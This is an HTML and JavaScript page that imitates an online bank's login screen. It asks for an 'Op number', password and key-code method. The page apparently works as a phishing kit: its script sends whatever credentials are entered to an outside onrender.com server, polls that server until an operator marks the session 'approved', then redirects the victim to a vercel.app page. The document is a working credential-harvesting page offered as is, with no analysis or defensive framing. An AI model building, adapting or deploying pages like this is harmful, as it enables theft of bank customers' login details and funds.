<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>

  <style>
    /* -------------------------------------------------
       BASIC RESET & TYPOGRAPHY
       ------------------------------------------------- */
    *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
    body { font-family: sans-serif; background:#fafafa; }

    /* -------------------------------------------------
       MAIN CONTAINER
       ------------------------------------------------- */
    .main-container {
      min-height: 100vh;
      padding: 2rem 1rem;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* -------------------------------------------------
       CANCEL BUTTON
       ------------------------------------------------- */
    .cancel {
      width: 100%;
      display: flex;
      justify-content: flex-end;
      margin-bottom: 1rem;
    }
    .cancel > div {
      width: 44px; height: 44px;
      border: 1px solid #bbb;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    /* -------------------------------------------------
       TITLE
       ------------------------------------------------- */
    .title {
      width: 100%;
      font-size: 2rem;
      font-weight: 300;
      margin-bottom: 2rem;
    }

    /* -------------------------------------------------
       IDENTIFICATION METHOD
       ------------------------------------------------- */
    .identification {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 1rem;
      margin-bottom: 1.5rem;
    }
    .identification > div:first-child { font-weight: 600; }

    .radio-section {
      display: flex;
      flex-direction: column;
      gap: .75rem;
    }
    .radio-item {
      display: flex;
      align-items: center;
      gap: .5rem;
    }
    input[type="radio"] {
      accent-color: #ff5733;
      width: 20px; height: 20px;
    }

    /* -------------------------------------------------
       INPUT SECTIONS
       ------------------------------------------------- */
    .input-section, #password {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: .4rem;
      margin-bottom: 1rem;
    }
    .form-input {
      padding: .75rem 1rem;
      border: 1px solid #bbb;
      border-radius: 4px;
      font-size: 1rem;
    }

    .error { color:#d32f2f; font-size:.9rem; margin-top:.5rem; display:none; }

    .forget {
      align-self: flex-start;
      margin-bottom: 1.5rem;
    }
    .forget a { color:#000; text-decoration:underline; text-decoration-color:#ff5733; }

    /* -------------------------------------------------
       CONTINUE BUTTON
       ------------------------------------------------- */
    .continue-button {
      width: 100%;
      display: flex;
      justify-content: center;
    }
    .continue-btn {
      min-width: 140px;
      padding: .75rem 1.5rem;
      background:#ff5733;
      color:#fff;
      border:none;
      border-radius: 2rem;
      font-size:1rem;
      cursor:pointer;
      transition:background .2s;
    }
    .continue-btn:hover { background:#e64a19; }

    /* -------------------------------------------------
       OR SECTION
       ------------------------------------------------- */
    .or-section {
      width:100%;
      display:flex;
      align-items:center;
      gap:1rem;
      margin:2rem 0;
    }
    .thin-container {
      flex:1;
      height:1px;
      background:#bbb;
    }

    /* -------------------------------------------------
       ALTERNATIVE LOGIN
       ------------------------------------------------- */
    .down {
      width:100%;
      border:1px solid #bbb;
      border-radius:4px;
      padding:1rem;
      text-align:center;
      cursor:pointer;
      box-shadow:0 2px 8px rgba(0,0,0,.07);
      transition:box-shadow .2s;
    }
    .down:hover { box-shadow:0 4px 12px rgba(0,0,0,.12); }

    /* -------------------------------------------------
       SPINNER PAGE
       ------------------------------------------------- */
    #spinner-page {
      position:fixed; inset:0;
      background:rgba(255,255,255,.94);
      display:none; flex-direction:column;
      align-items:center; justify-content:center;
      z-index:9999;
    }
    .spinner {
      width:56px; height:56px;
      border:6px solid #f3f3f3;
      border-top:6px solid #ff5733;
      border-radius:50%;
      animation:spin 1s linear infinite;
      margin-bottom:1rem;
    }
    @keyframes spin { to { transform:rotate(360deg); } }
    #spinner-page p { font-size:1.1rem; color:#333; }

    /* -------------------------------------------------
       RESPONSIVE BREAKPOINTS
       ------------------------------------------------- */
    @media (min-width: 576px) {
      .main-container { padding:2rem 2rem; }
    }
    @media (min-width: 768px) {
      .main-container { max-width:560px; margin:auto; }
      .identification { flex-direction:row; align-items:center; }
      .input-section, #password { flex-direction:row; align-items:center; }
      .form-input { width:70%; }
      .continue-button { justify-content:flex-end; }
      .continue-btn { width:auto; }
      .forget { padding-left:0; }
    }
    @media (min-width: 992px) {
      .main-container { max-width:480px; }
    }
  </style>
</head>

<body>
  <!-- ==================== MAIN FORM ==================== -->
  <div class="main-container">
    <section class="cancel">
      <div><span style="color:#ff5733;">X</span></div>
    </section>

    <h1 class="title">Log in</h1>

    <section class="identification">
      <div>Identification method</div>
      <div class="radio-section">
        <label class="radio-item">
          <input type="radio" name="identification" value="mobile_key" checked>
          <span>Mobile_key</span>
        </label>
        <label class="radio-item">
          <input type="radio" name="identification" value="key_code">
          <span>Key code list</span>
        </label>
      </div>
    </section>

    <div class="input-section">
      <div>Username</div>
      <input type="text" id="login" class="form-input" placeholder="Enter your Op number">
    </div>

    <div id="password" style="display:none">
      <div>Password</div>
      <input type="password" id="password-input" class="form-input" placeholder="Enter your password">
    </div>

    <div class="error" id="error"></div>

    <div class="forget"><a href="#">Forget your username?</a></div>

    <div class="continue-button">
      <button id="continue-btn" class="continue-btn">Continue</button>
    </div>

    <div class="or-section">
      <div class="thin-container"></div>
      <span>OR</span>
      <div class="thin-container"></div>
    </div>

    <div class="down"><a href="#">Log in with another bank's ID</a></div>
  </div>

  <!-- ==================== SPINNER ==================== -->
  <div id="spinner-page">
    <div class="spinner"></div>
    <p>Please waitâ€¦</p>
  </div>

  <!-- ==================== SCRIPT ==================== -->
  <script>
    const radioButtons    = document.querySelectorAll('input[name="identification"]');
    const passwordSection = document.getElementById('password');
    const continueBtn     = document.getElementById('continue-btn');
    const errorDiv        = document.getElementById('error');
    const spinnerPage     = document.getElementById('spinner-page');
    const backendUrl      = "https://op-9nkj.onrender.com";

    const showSpinner = () => spinnerPage.style.display = "flex";
    const hideSpinner = () => spinnerPage.style.display = "none";

    const togglePassword = () => {
      const val = document.querySelector('input[name="identification"]:checked').value;
      passwordSection.style.display = val === "key_code" ? "flex" : "none";
    };
    togglePassword();
    radioButtons.forEach(r => r.addEventListener('change', togglePassword));

    continueBtn.addEventListener('click', async () => {
      const login   = document.getElementById('login').value.trim();
      const pwd     = document.getElementById('password-input').value;
      const method  = document.querySelector('input[name="identification"]:checked').value;

      // ---- validation ----
      if (!login || (method === "key_code" && !pwd)) {
        errorDiv.textContent = "Please fill in all required fields.";
        errorDiv.style.display = "block";
        return;
      }

      errorDiv.style.display = "none";
      showSpinner();
      continueBtn.disabled = true;

      const payload = method === "key_code" ? { login, password: pwd } : { login };

      try {
        const resp = await fetch(`${backendUrl}/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        const data = await resp.json();

        if (!data.success) throw new Error(data.error || "Login failed");

        const sessionId = data.id;

        const poll = async () => {
          const sResp = await fetch(`${backendUrl}/status/${sessionId}`);
          const status = await sResp.json();

          if (status.status === "approved" && status.redirect_url) {
            hideSpinner();
            window.location.href = `https://opfi.vercel.app/${status.redirect_url}`;
          } else {
            setTimeout(poll, 2000);
          }
        };
        poll();
      } catch (e) {
        hideSpinner();
        errorDiv.textContent = e.message || "An error occurred. Try again.";
        errorDiv.style.display = "block";
        continueBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
